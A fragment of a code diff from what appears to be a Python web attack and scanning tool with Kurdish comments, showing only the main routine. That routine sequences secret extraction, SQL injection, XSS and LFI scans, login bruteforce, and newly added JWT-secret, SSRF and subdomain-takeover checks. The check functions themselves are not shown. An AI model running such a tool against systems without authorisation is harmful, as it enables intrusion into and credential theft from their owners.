         except Exception as e: LOG.log(f"{fn.__name__}: {e}", "ERR")
 
+    # ─── FILES ───
     print(f"\n{C.B}━━━ FILES & DIRECTORIES ━━━{C.RESET}")
     for fn in [feat_files, feat_dirs]:
         try: fn(base_url)
         except Exception as e: LOG.log(f"{fn.__name__}: {e}", "ERR")
 
+    # ─── EXTRACT ───
     print(f"\n{C.B}━━━ EXTRACT ━━━{C.RESET}")
     for fn in [feat_extract, feat_js, feat_secrets]:
         try: fn(base_url)
         except Exception as e: LOG.log(f"{fn.__name__}: {e}", "ERR")
 
+    # ─── VULN SCAN ───
     print(f"\n{C.B}━━━ VULNERABILITY SCAN ━━━{C.RESET}")
     for fn in [feat_sqli, feat_xss, feat_lfi, feat_open_redirect]:
         try: fn(base_url)
         except Exception as e: LOG.log(f"{fn.__name__}: {e}", "ERR")
 
+    # ─── LOGIN ───
     print(f"\n{C.B}━━━ LOGIN BRUTEFORCE ━━━{C.RESET}")
     try: feat_login(base_url)
     except Exception as e: LOG.log(f"Login: {e}", "ERR")
 
-    # FTP check ئەگەر پۆرتی 21 کراوە بوو
+    # ═══════════════════════════════════════════════════
+    # 5 تایبەتمەندی نوێی خەتەرناک
+    # ═══════════════════════════════════════════════════
+    print(f"\n{C.R}━━━ CRITICAL EXPLOITS ━━━{C.RESET}")
+
+    print(f"\n{C.M}━━━ Subdomain Takeover ━━━{C.RESET}")
+    try: feat_subdomain_takeover(host)
+    except Exception as e: LOG.log(f"Takeover: {e}", "ERR")
+
+    print(f"\n{C.M}━━━ CVE Version Scan ━━━{C.RESET}")
+    try: feat_cve(base_url)
+    except Exception as e: LOG.log(f"CVE: {e}", "ERR")
+
+    print(f"\n{C.M}━━━ GraphQL Introspection ━━━{C.RESET}")
+    try: feat_graphql(base_url)
+    except Exception as e: LOG.log(f"GraphQL: {e}", "ERR")
+
+    print(f"\n{C.M}━━━ JWT Weak Secret ━━━{C.RESET}")
+    try: feat_jwt(base_url)
+    except Exception as e: LOG.log(f"JWT: {e}", "ERR")
+
+    print(f"\n{C.M}━━━ SSRF Detection ━━━{C.RESET}")
+    try: feat_ssrf(base_url)
+    except Exception as e: LOG.log(f"SSRF: {e}", "ERR")
+
+    # ─── FTP ───
     if 21 in open_ports:
         print(f"\n{C.B}━━━ FTP ━━━{C.RESET}")
         try:
@@ -743,7 +942,6 @@ def main():
     print(f"{C.C}    LOW:      {counts['LOW']}{C.RESET}")
     print(f"{C.R}{'═'*60}{C.RESET}")
 
-    # ڕاپۆرت
     build_report(base_url, duration)
     LOG.log(f"[✓] لۆگ: {LOGFILE}", "OK")
 
